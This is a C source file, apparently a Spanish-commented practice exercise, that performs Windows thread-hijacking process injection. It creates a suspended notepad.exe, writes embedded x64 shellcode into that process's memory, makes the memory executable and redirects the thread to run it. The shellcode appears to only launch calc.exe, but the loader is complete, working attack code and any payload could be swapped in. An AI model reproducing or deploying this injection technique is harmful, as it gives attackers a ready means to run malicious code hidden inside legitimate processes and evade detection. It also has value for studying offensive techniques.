#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress);
BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress);

int main() {

    // Imprimir mensaje en consola
    printf("tecnica 2 - test 2\n");

    DWORD dwProcessId;
    HANDLE hProcess, hThread;
    PVOID pRemoteAddress;

    // Crear el proceso suspendido
    if (!CreateSuspendedProcess("notepad.exe", &dwProcessId, &hProcess, &hThread)) {
        printf("[!] Failed to create the suspended process.\n");
        return -1;
    }
    printf("[+] Suspended process created successfully.\n");

    // Inyectar el shellcode en el proceso remoto
    if (!InjectShellcodeToRemoteProcess(hProcess, shellcode, sizeof(shellcode), &pRemoteAddress)) {
        printf("[!] Failed to inject shellcode.\n");
        return -1;
    }
    printf("[+] Shellcode injected successfully at address: 0x%p\n", pRemoteAddress);

    // Secuestrar el hilo para ejecutar el shellcode
    if (!HijackThread(hThread, pRemoteAddress)) {
        printf("[!] Failed to hijack the thread.\n");
        return -1;
    }
    printf("[+] Thread hijacked successfully.\n");

    // Cerrar los handles del proceso y del hilo
    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];
    STARTUPINFOA Si;
    PROCESS_INFORMATION Pi;

    ZeroMemory(&Si, sizeof(STARTUPINFOA));
    ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOA);

    // Obtener la variable de entorno WINDIR para construir la ruta
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    // Crear la ruta completa del ejecutable
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    printf("\n[i] Running: \"%s\" ... ", lpPath);

    // Corregir el tipo de dato del segundo parámetro
    if (!CreateProcessA(lpPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {
        printf("[!] CreateProcessA Failed with Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] DONE\n");

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n[!] VirtualAllocEx Failed With Error: %d\n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At: 0x%p\n", *ppAddress);

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("\n[!] WriteProcessMemory Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n[!] VirtualProtectEx Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
    CONTEXT ThreadCtx = { 0 };
    ThreadCtx.ContextFlags = CONTEXT_CONTROL;

    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("\n[!] GetThreadContext Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    ThreadCtx.Rip = (DWORD64)pAddress;

    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("\n[!] SetThreadContext Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}
